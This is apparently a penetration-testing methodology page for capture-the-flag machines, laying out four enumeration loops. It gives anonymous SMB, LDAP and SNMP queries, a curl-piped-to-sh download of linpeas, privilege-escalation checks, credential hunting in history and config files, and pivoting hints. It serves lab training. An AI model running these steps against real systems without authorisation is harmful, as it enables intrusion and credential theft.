# Enumeration-First Mindset

> Enumeration is not a phase you finish; it is a state you keep returning to.
> Every credential, shell, or piece of context obtained restarts enumeration
> with new powers.

## The four enumeration loops

1. **External enumeration** — what the box exposes to anyone on the network.
2. **Authenticated enumeration** — what you can see once you have *any* user
   credential, even an empty / null one.
3. **On-host enumeration** — what you can see once you have a shell as some
   user, however unprivileged.
4. **Lateral enumeration** — what you can see now that this box is one node
   in a network you can pivot through.

Skip a loop and you will spend hours brute-forcing what was already free.

## Loop 1 — External

| Goal | Tool | Output you must capture |
|---|---|---|
| All TCP ports | `nmap -p- --min-rate=10000` | All open ports |
| Service versions | `nmap -sV -sC -p <ports>` | Banner, version, hostnames in certs |
| UDP top ports | `nmap -sU --top-ports 50` | SNMP (161), DNS (53), Kerberos (88) hints |
| Web vhosts | `ffuf -H "Host: FUZZ.<box>.htb"` | Subdomains |
| Web content | `gobuster dir` / `feroxbuster` | Hidden paths |
| DNS | `dig`, `nslookup -type=any` | Domain name, hostnames |

Sanity test: after Loop 1, you should be able to **draw the box**: a
diagram of every service it speaks. If you can't, you are not done.

## Loop 2 — Authenticated (with the *cheapest* creds)

The cheapest creds are: `null`, `guest`, `anonymous`, defaults of the
appliance.

```bash
# SMB
smbmap -H <ip>                              # auto-anonymous
smbmap -H <ip> -u guest -p ''
smbclient //<ip>/IPC$ -N                    # null on IPC$ often grants enumeration

# RPC null session
rpcclient -U "" -N <ip>
> srvinfo
> enumdomusers
> querydispinfo
> getdompwinfo

# LDAP anonymous
ldapsearch -x -H ldap://<ip> -s base
ldapsearch -x -H ldap://<ip> -b "<base-dn>" "(objectClass=user)"
ldapsearch -x -H ldap://<ip> -b "<base-dn>" "(objectClass=user)" sAMAccountName description

# FTP anon
ftp <ip> # anonymous / blank password

# SNMP (UDP 161, public is default)
snmpwalk -c public -v1 <ip>
snmp-check <ip>
```

These almost never raise alarms. They *frequently* yield the entire user
list (Forest, Sauna, Cascade) or the credentials directly (Active).

## Loop 3 — On-host

After every shell, run an automated enum tool first, then human-read the
output.

### Linux

```bash
# fast and noisy, but full coverage
curl -s https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# alternatives
./LinEnum.sh -t           # quicker, smaller
./linux-exploit-suggester.sh
```

After linpeas, the *human* search:
```bash
sudo -l                              # what can this user run as root?
find / -perm -4000 2>/dev/null       # SUID
find / -writable -type d 2>/dev/null # writable dirs
getcap -r / 2>/dev/null              # capabilities
crontab -l; ls -la /etc/cron*        # scheduled tasks
ss -tlnp; netstat -tlnp              # local-only services
ps -ef | grep -v "\[" | sort -u      # uncommon processes
cat /etc/passwd | grep /bash         # other interactive users
ls -la /home/*; ls -la /root 2>/dev/null
```

### Windows

```powershell
# winPEAS
.\winPEASany.exe                      # one-shot, recommend "quiet" mode

# manual checks
whoami /priv
whoami /groups
systeminfo
net user
net localgroup administrators
Get-LocalUser
Get-ChildItem Env:
Get-Service | Where-Object {$_.Status -eq 'Running'}
Get-Process -IncludeUserName
```

### Cross-cutting

Always look at:
- `~/.bash_history`, `~/.zsh_history`, `~/.lesshst` (Linux)
- `Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
  (Windows — frequently contains creds; demonstrated in many IppSec
  videos)
- App config files in the user's home and `C:\inetpub\`
- Database connection strings in `web.config`, `appsettings.json`, `.env`,
  `wp-config.php`

## Loop 4 — Lateral

Once on a host, treat that host's view of the network as a fresh Loop 1.

```bash
# from the compromised box
arp -a                                # already-known neighbours
ip route; route print
cat /etc/hosts                        # static mappings (often credential goldmines on small networks)

# port-scan the next subnet via the foothold
# (most painless approach: chisel reverse SOCKS, then nmap from attacker)
```

See `pivoting/` and `tunneling/` for the mechanics.

## What "enumeration-first" actually means

It means three commitments:

1. **Never run an exploit before enumeration completes for that surface.**
2. **Never assume the obvious answer is the real answer until enumeration
   confirms it.**
3. **Never call privesc "stuck" until you have re-enumerated as the new
   user.**

Operational tells that you've broken these commitments:
- You're brute-forcing creds against a service before listing usernames.
- You're chaining 0-days when an `anonymous` login worked.
- You're searching for kernel exploits before reading `sudo -l`.

## Anti-patterns

| Anti-pattern | Why it's wrong |
|---|---|
| Running every script in `nmap` `--script vuln` | Half false-positives, half misses |
| Brute-forcing logins before listing usernames | You may have free creds in LDAP |
| Running linpeas once and assuming it's done | New shells = new contexts |
| Trusting "no shares listed" | Hidden shares (e.g., `IPC$`, `ADMIN$`, named shares) require explicit access |
| Treating CVEs as the primary plan | Most boxes are won by misconfig, not CVE |

## See also

- [01-initial-foothold.md](01-initial-foothold.md)
- [03-service-prioritization.md](03-service-prioritization.md)
- [09-credential-hunting.md](09-credential-hunting.md)
- [../enumeration/](../enumeration/)
